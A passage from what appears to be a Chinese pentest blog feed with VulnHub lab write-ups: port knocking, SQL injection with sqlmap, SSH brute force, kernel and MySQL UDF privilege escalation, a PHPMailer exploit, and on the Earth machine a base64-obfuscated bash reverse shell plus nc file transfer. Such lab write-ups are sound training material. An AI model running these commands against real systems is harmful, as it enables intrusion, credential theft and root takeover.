进行敲击</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> knockdknock <span class="token number">192.168</span>.80.132 <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token parameter variable">-v</span>nmap  <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.80.132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806001044.png|L]]</p><p>获得新的端口1337</p><p>或者使用 nmap 敲击</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-v0</span> <span class="token parameter variable">-Pn</span> --max-retries <span class="token number">0</span> <span class="token parameter variable">-p</span> <span class="token number">1</span> <span class="token number">192.168</span>.80.132nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-v0</span> <span class="token parameter variable">-Pn</span> --max-retries <span class="token number">0</span> <span class="token parameter variable">-p</span> <span class="token number">2</span> <span class="token number">192.168</span>.80.132nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-v0</span> <span class="token parameter variable">-Pn</span> --max-retries <span class="token number">0</span> <span class="token parameter variable">-p</span> <span class="token number">3</span> <span class="token number">192.168</span>.80.132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数解析：</p><ul><li>-n：不进行 DNS 解析</li><li>-v0：不进行结果输出</li><li>-Pn：不进行主机扫描（默认将所有的主机视为在线），直接进行更深层次的扫描</li><li>–max-retries 0：最多重传次数为 0，即不允许被重传</li><li>-p ：指定扫描端口</li></ul><blockquote><p>端口碰撞后开启的端口 只有碰撞的主机ip可以访问 其他未碰撞主机的还是无法访问<br>在kali里面可以访问<br>在win10无法访问</p></blockquote><p>—————————————————————</p><h2 id="4-网页渗透"><a href="#4-网页渗透" class="headerlink" title="4. 网页渗透"></a>4. 网页渗透</h2><p>访问1337端口获得一个网页，只有一只图片，没给啥信息</p><p>![[../../../../pic/Pasted image 20220806003037.png|L]]</p><p>扫描目录，获取到404.html，检查页面源代码，获取到密文</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIhLzk3ODM0NTIxMC9pbmRleC5waHA= Closer!/978345210/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在登录处可以进行 SQL 注入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.80.132:1337/978345210/index.php"</span> <span class="token parameter variable">--data</span> <span class="token string">"password=1&amp;submit=+Login+&amp;username=1"</span> <span class="token parameter variable">-D</span> Webapp <span class="token parameter variable">-T</span> Users <span class="token parameter variable">--dump</span> --time-sec <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806003401.png|L]]</p><p>获取到了用户名以及密码，登录后没啥有用的信息，爆破一下 SSH 端口</p><h2 id="5-端口渗透"><a href="#5-端口渗透" class="headerlink" title="5. 端口渗透"></a>5. 端口渗透</h2><h3 id="3-1-SSH-22-端口-1"><a href="#3-1-SSH-22-端口-1" class="headerlink" title="3.1 SSH - 22  端口"></a>3.1 SSH - 22  端口</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"frodo<span class="token entity" title="\n">\n</span>smeagol<span class="token entity" title="\n">\n</span>aragorn<span class="token entity" title="\n">\n</span>legolas<span class="token entity" title="\n">\n</span>gimli"</span> <span class="token operator">&gt;</span> users.txt<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"iwilltakethering<span class="token entity" title="\n">\n</span>MyPreciousR00t<span class="token entity" title="\n">\n</span>AndMySword<span class="token entity" title="\n">\n</span>AndMyBow<span class="token entity" title="\n">\n</span>AndMyAxe"</span> <span class="token operator">&gt;</span> passwd.txthydra <span class="token parameter variable">-L</span> users.txt  <span class="token parameter variable">-P</span> passwd.txt <span class="token parameter variable">-e</span> nsr <span class="token parameter variable">-s</span> <span class="token number">22</span> <span class="token number">192.168</span>.80.132 <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806003916.png|L]]</p><p>获得用户 smeagol / MyPreciousR00t</p><h2 id="6-权限提升"><a href="#6-权限提升" class="headerlink" title="6. 权限提升"></a>6. 权限提升</h2><h3 id="6-1-内核提权"><a href="#6-1-内核提权" class="headerlink" title="6.1 内核提权"></a>6.1 内核提权</h3><p>查看系统内核</p><pre class="line-numbers language-none"><code class="language-none">uname -ahostnamectl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806004818.png|L]]</p><p>操作系统为  Ubuntu 14.04.3，内核为 Linux Kernel 3.19.0</p><p>![[../../../../pic/Pasted image 20220806010330.png|L]]</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/39166.c ./python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span><span class="token function">wget</span> http://172.29.59.89/39166.cgcc <span class="token number">39166</span>.c <span class="token parameter variable">-o</span> exp./exp<span class="token function">id</span><span class="token function">cat</span> /root/Flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806012341.png|L]]</p><h3 id="6-2-UDF-提权"><a href="#6-2-UDF-提权" class="headerlink" title="6.2 UDF 提权"></a>6.2 UDF 提权</h3><p>查看数据库运行情况</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-aux</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"mysql"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806013059.png|L]]</p><p>查看数据库版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806013134.png|L]]</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"mysql"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806013238.png|L]]</p><p>为 5.5.44 版本，在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件<br>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p><p>从网站文件中读取数据库用户以及密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www <span class="token parameter variable">-type</span> f <span class="token operator">|</span> <span class="token function">xargs</span>  <span class="token function">grep</span> <span class="token string">"db"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806013629.png|L]]</p><p>获得 root / darkshadow，登录进去查看文件写入权限</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> gloab variables <span class="token operator">like</span> <span class="token string">'secure%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806013853.png|L]]</p><p><strong>secure_file_priv</strong>  为空，可以进行提权操作，进一步确认插件写入位置</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%plugin%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806014036.png|L]]</p><p>使用 msf 的 udf 进行提权操作，目录在 /usr/share/metasploit-framework/data/exploits/mysql/</p><p>查看框架</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"%version%"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806014242.png|L]]</p><p>使用的是 32 位的，选用 32 位的文件进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>攻击机<span class="token punctuation">]</span><span class="token function">cp</span> /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so ./python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span><span class="token punctuation">[</span>靶机<span class="token punctuation">]</span><span class="token function">wget</span> http://172.29.59.89/lib_mysqludf_sys_32.so mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-pdarkshadow</span>create table udf<span class="token punctuation">(</span>data longblob<span class="token punctuation">)</span><span class="token punctuation">;</span> // 创建临时表存储 udfinsert into udf <span class="token punctuation">(</span>data<span class="token punctuation">)</span> values <span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/home/smeagol/lib_mysqludf_sys_32.so'</span><span class="token punctuation">))</span><span class="token punctuation">;</span>  // 写入 udf 到临时表<span class="token keyword">select</span> data from udf into dumpfile <span class="token string">'/usr/lib/mysql/plugin/udf.so'</span><span class="token punctuation">;</span>  // 写入 udf 到插件create <span class="token keyword">function</span> sys_eval returns string soname <span class="token string">'udf.so'</span><span class="token punctuation">;</span>  // 创建 sys_eval 函数<span class="token keyword">select</span> * from mysql.func<span class="token punctuation">;</span> // 查找已自定义函数<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // 以 root 权限执行命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806015603.png|L]]</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'chmod u+s /usr/bin/find'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // 给 <span class="token function">find</span> 命令所有者的suid权限，使其可以执行root命令<span class="token function">mkdir</span> a<span class="token function">find</span> a <span class="token parameter variable">-exec</span> <span class="token string">'/bin/sh'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>  // 进行提权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220806020643.png|L]]</p><h2 id="7-小结"><a href="#7-小结" class="headerlink" title="7. 小结"></a>7. 小结</h2><ul><li>端口碰撞以及使用的工具：knocd</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - Raven2</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-raven2/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-raven2/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-Raven2"><a href="#VulnHub-Raven2" class="headerlink" title="VulnHub - Raven2"></a>VulnHub - Raven2</h1><h2 id="1-前言-amp-搭建"><a href="#1-前言-amp-搭建" class="headerlink" title="1. 前言&amp;搭建"></a>1. 前言&amp;搭建</h2><p>Raven 2是一个中等难度的boot2root 虚拟靶机。有四个flag需要找出。在多次被攻破后，Raven Security采取了额外措施来增强他们的网络服务器安全以防止黑客入侵。</p><p>vulnhub靶场链接：<a href="https://download.vulnhub.com/raven/Raven2.ova">https://download.vulnhub.com/raven/Raven2.ova</a></p><p>拓扑图</p><table><thead><tr><th>作用</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>Kali</td><td>192.168.80.133</td></tr><tr><td>靶机</td><td>Debian</td><td>192.168.80.134</td></tr></tbody></table><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-获取目标-IP-地址"><a href="#2-1-获取目标-IP-地址" class="headerlink" title="2.1 获取目标 IP 地址"></a>2.1 获取目标 IP 地址</h3><p>扫描网段探测存活主机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.80.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220729215935.png|L]]</p><p>获取目标靶机 IP 地址为 192.168.80.134</p><h3 id="2-2-获取目标靶机开放的端口"><a href="#2-2-获取目标靶机开放的端口" class="headerlink" title="2.2 获取目标靶机开放的端口"></a>2.2 获取目标靶机开放的端口</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-T4</span> -p- <span class="token number">192.168</span>.80.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220729220232.png|L]]</p><p>确认开启服务：</p><ul><li>22 端口开放，提供 ssh 远程登录服务</li><li>80 端口开放，提供 http 服务</li><li>111 端口开放，主要用于分布式系统中不同计算机的内部进程通信</li></ul><h2 id="3-网页渗透"><a href="#3-网页渗透" class="headerlink" title="3. 网页渗透"></a>3. 网页渗透</h2><p>扫描一下目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 dirsearch.py <span class="token parameter variable">-u</span> http://192.168.80.134/ <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220729220819.png|L]]</p><p>访问 /vendor/ 存在任意目录访问</p><p>![[../../../../pic/Pasted image 20220729221059.png|L]]</p><p>访问 PATH 获得第一个 flag</p><p>![[../../../../pic/Pasted image 20220729221403.png|L]]</p><p>通过其他文件可以获得当前使用的框架版本为 phpmailer 5.2.16</p><p>使用 kali 搜一下是否存在漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit phpmailer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220729222003.png|L]]</p><p>把 POC 给拉出来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py  ~/Desktop <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改一下 URL，以及目录</p><p>![[../../../../pic/Pasted image 20220729223526.png|L]]</p><p>访问 shell.php 即可获得反弹 shell</p><p>![[../../../../pic/Pasted image 20220729223845.png|L]]</p><p>转 tty</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找一下 flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www <span class="token parameter variable">-name</span> <span class="token string">"flag*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220729230157.png|L]]</p><p>获取到两个flag</p><p>![[../../../../pic/Pasted image 20220729230239.png|L]]</p><p>![[../../../../pic/Pasted image 20220729230350.png|L]]</p><p>读取 wp-config.php 获取数据库用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> wordpress/wp-config.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220729225133.png|L]]</p><p>查看数据库运行情况</p><p>![[../../../../pic/Pasted image 20220729225229.png|L]]</p><p>![[../../../../pic/Pasted image 20220729225405.png|L]]</p><p>连接数据库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> -pR@v3nSecurity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220729231717.png|L]]</p><p>可以进行 mysql UDF 提取</p><p>在攻击机上进行编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit udf <span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/1518.c ~/Desktop <span class="token function">mv</span> <span class="token number">1518</span>.c raptor_udf2.cgcc <span class="token parameter variable">-g</span> <span class="token parameter variable">-c</span> raptor_udf2.cgcc <span class="token parameter variable">-g</span> <span class="token parameter variable">-shared</span> -Wl,-soname,raptor_udf2.so <span class="token parameter variable">-o</span> raptor_udf2.so raptor_udf2.o <span class="token parameter variable">-lc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.80.133/raptor_udf2.somysql <span class="token parameter variable">-uroot</span> -pR@v3nSecurityshow variables like <span class="token string">"%plugin%"</span>use mysql<span class="token punctuation">;</span> create table foo<span class="token punctuation">(</span>line blob<span class="token punctuation">)</span><span class="token punctuation">;</span>insert into foo values<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/var/www/html/raptor_udf2.so'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token keyword">select</span> * from foo into dumpfile <span class="token string">'/usr/lib/mysql/plugin/raptor_udf2.so'</span><span class="token punctuation">;</span>create <span class="token keyword">function</span> do_system returns integer soname <span class="token string">'raptor_udf2.so'</span><span class="token punctuation">;</span><span class="token keyword">select</span> * from mysql.func<span class="token punctuation">;</span><span class="token keyword">select</span> do_system<span class="token punctuation">(</span><span class="token string">'cat /root/fl* &gt; /var/www/html/out &amp;&amp; chmod 777 /var/www/html/out'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">\</span><span class="token operator">!</span> <span class="token function">sh</span><span class="token function">cat</span> /var/www/html/out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220730002153.png|L]]</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - THE PLANETS_EARTH</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-the-planets-earth/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-the-planets-earth/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-THE-PLANETS-EARTH"><a href="#VulnHub-THE-PLANETS-EARTH" class="headerlink" title="VulnHub - THE PLANETS_EARTH"></a>VulnHub - THE PLANETS_EARTH</h1><h2 id="0-靶场搭建"><a href="#0-靶场搭建" class="headerlink" title="0. 靶场搭建"></a>0. 靶场搭建</h2><p><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">Vulnhub 链接</a></p><p>难度：简单</p><h2 id="1-信息收集与利用"><a href="#1-信息收集与利用" class="headerlink" title="1. 信息收集与利用"></a>1. 信息收集与利用</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><p>使用 nmap 进行扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.10.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221015195434.png"></p><p>靶机 IP 为 192.168.10.128</p><h3 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h3><p>使用 nmap 进行扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.10.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221015200620.png"></p><p>可以看到使用 Python 3.9 搭建的 Web 服务，开放了 22、80、443端口，以及探测出来DNS 使用的解析为 ==earth.local== 与 ==terratest.earth.local==，添加个 DNS 解析</p><p>访问 <a href="https://earth.local/">https://earth.local/</a> </p><p><img src="/../../../../pic/Pasted%20image%2020221015204216.png" alt="|1000"></p><h3 id="1-3-目录扫描"><a href="#1-3-目录扫描" class="headerlink" title="1.3 目录扫描"></a>1.3 目录扫描</h3><p>使用 dirsearch 进行目录扫描，两个域名都扫一下</p><p><a href="https://terratest.earth.local/">https://terratest.earth.local/</a></p><p><img src="/../../../../pic/Pasted%20image%2020221015210505.png"></p><p><a href="https://earth.local/">https://earth.local/</a></p><p><img src="/../../../../pic/Pasted%20image%2020221015210847.png"></p><h2 id="2-WEB"><a href="#2-WEB" class="headerlink" title="2. WEB"></a>2. WEB</h2><p>访问 <a href="https://terratest.earth.local/robots.txt">https://terratest.earth.local/robots.txt</a> 获得提示</p><p><img src="/../../../../pic/Pasted%20image%2020221015214509.png" alt="|580"></p><p>爆破一下文件后缀</p><p><img src="/../../../../pic/Pasted%20image%2020221015215921.png"></p><p>得到提示内容</p><pre class="line-numbers language-none"><code class="language-none">Testing secure messaging system notes:*Using XOR encryption as the algorithm, should be safe as used in RSA.*Earth has confirmed they have received our sent messages.*testdata.txt was used to test encryption.*terra used as username for admin portal.Todo:*How do we send our monthly keys to Earth securely? Or should we change keys weekly?*Need to test different key lengths to protect against bruteforce. How long should the key be?*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提取一些有用的信息，testdata.txt 被用作 XOR 运算加密了一些内容，terra 是管理员 portal 的用户名</p><p>访问 <a href="https://terratest.earth.local/testdata.txt">https://terratest.earth.local/testdata.txt</a></p><pre class="line-numbers language-none"><code class="language-none">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主页上将 Message 与 Message key 进行了异或处理，处理之后将结果转换为16进制输出出来</p><p>因为 A^B^A = B 取前三组数据转换为字符串后进行异或处理，使用 <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('None')XOR(%7B'option':'UTF8','string':'According%20to%20radiometric%20dating%20estimation%20and%20other%20evidence,%20Earth%20formed%20over%204.5%20billion%20years%20ago.%20Within%20the%20first%20billion%20years%20of%20Earth%5C's%20history,%20life%20appeared%20in%20the%20oceans%20and%20began%20to%20affect%20Earth%5C's%20atmosphere%20and%20surface,%20leading%20to%20the%20proliferation%20of%20anaerobic%20and,%20later,%20aerobic%20organisms.%20Some%20geological%20evidence%20indicates%20that%20life%20may%20have%20arisen%20as%20early%20as%204.1%20billion%20years%20ago.'%7D,'Standard',false)&amp;input=MjQwMjExMWIxYTA3MDUwNzBhNDEwMDBhNDMxYTAwMGEwZTBhMGYwNDEwNDYwMTE2NGQwNTBmMDcwYzBmMTU1NDBkMTAxODAwMDAwMDAwMGMwYzA2NDEwZjA5MDE0MjBlMTA1YzBkMDc0ZDA0MTgxYTAxMDQxYzE3MGQ0ZjRjMmMwYzEzMDAwZDQzMGUwZTFjMGEwMDA2NDEwYjQyMGQwNzRkNTU0MDQ2NDUwMzFiMTgwNDBhMDMwNzRkMTgxMTA0MTExYjQxMGYwMDBhNGM0MTMzNWQxYzFkMDQwZjRlMDcwZDA0NTIxMjAxMTExZjFkNGQwMzFkMDkwZjAxMGUwMDQ3MWMwNzAwMTY0NzQ4MWEwYjQxMmIxMjE3MTUxYTUzMWI0MzA0MDAxZTE1MWIxNzFhNDQ0MTAyMGUwMzA3NDEwNTQ0MTgxMDBjMTMwYjE3NDUwODFjNTQxYzBiMDk0OTAyMDIxMTA0MGQxYjQxMGYwOTAxNDIwMzAxNTMwOTFiNGQxNTAxNTMwNDA3MTQxMTBiMTc0YzJjMGMxMzAwMGQ0NDFiNDEwZjEzMDgwZDEyMTQ1YzBkMDcwODQxMGYxZDAxNDEwMTAxMWEwNTBkMGEwODRkNTQwOTA2MDkwNTA3MDkwMjQyMTUwYjE0MWMxZDA4NDExZTAxMGEwZDFiMTIwZDExMGQxZDA0MGUxYTQ1MGMwZTQxMGYwOTA0MDcxMzBiNTYwMTE2NGQwMDAwMTc0OTQxMWUxNTFjMDYxZTQ1NGQwMDExMTcwYzBhMDgwZDQ3MGExMDA2MDU1YTAxMDYwMDEyNDA1MzM2MGUxZjExNDgwNDA5MDYwMTBlMTMwYzAwMDkwZDRlMDIxMzBiMDUwMTVhMGIxMDRkMDgwMDE3MGMwMjEzMDAwZDEwNGMxZDA1MDAwMDQ1MGYwMTA3MGI0NzA4MDMxODQ0NWMwOTAzMDg0MTBmMDEwYzEyMTcxYTQ4MDIxZjQ5MDgwMDA2MDkxYTQ4MDAxZDQ3NTE0YzUwNDQ1NjAxMTkwMTA4MDExZDQ1MTgxNzE1MWExMDRjMDgwYTBlNWE">CyberChef</a></p><p><img src="/../../../../pic/Pasted%20image%2020221015221652.png"></p><p>获得字符串 earthclimatechangebad4humans 为用户密码</p><p>使用用户 terra / earthclimatechangebad4humans 成功登入后台</p><p><img src="/../../../../pic/Pasted%20image%2020221015221952.png"></p><p>可以进行命令执行但是权限较低，先获得 shell 然后进行命令执行</p><h2 id="3-拿-Sehll"><a href="#3-拿-Sehll" class="headerlink" title="3. 拿 Sehll"></a>3. 拿 Sehll</h2><p>已知服务器上存在 python3 环境，于是使用 python 进行反弹 shel</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjEyOS80NDQ0IDA+JjE<span class="token operator">=</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span> <span class="token operator">|</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016004900.png"></p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>尝试使用 suid 提取</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016010626.png"></p><p>发现文件 reset_root，从文件名来看是用于重置 root 用户的，将该文件下载下来分析</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4444</span> <span class="token operator">&gt;</span> reset_root<span class="token function">nc</span> <span class="token number">192.168</span>.10.129 <span class="token number">4444</span> <span class="token operator">&lt;</span> /usr/bin/reset_root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当某些条件满足的时候会重置 root 用户的密码</p><p><img src="/../../../../pic/Pasted%20image%2020221016010530.png"></p><p>使用 ==ltrace== 分析一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace ./reset_root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016010940.png"></p><p>当三个文件存在时即可重置 root 用户密码</p><p>创建这三个文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> /dev/shm/kHgTFI5G<span class="token function">touch</span> /dev/shm/Zw7bV9U5                                                                                                   <span class="token function">touch</span> /tmp/kcM0Wewe                                                                                                            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016011039.png"></p><p>运行 reset_root</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./usr/bin/reset_root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016011232.png"></p><p>成功重置 root 用户密码为 Earth</p><p><img src="/../../../../pic/Pasted%20image%2020221016011445.png"></p><h2 id="5-获取-flag"><a href="#5-获取-flag" class="headerlink" title="5. 获取 flag"></a>5. 获取 flag</h2><p>在 root 用户根目录下找到 flag</p><p><img src="/../../../../pic/Pasted%20image%2020221016011529.png"></p><p>全局搜索 flag</p><pre class="line-numbers language-bash" 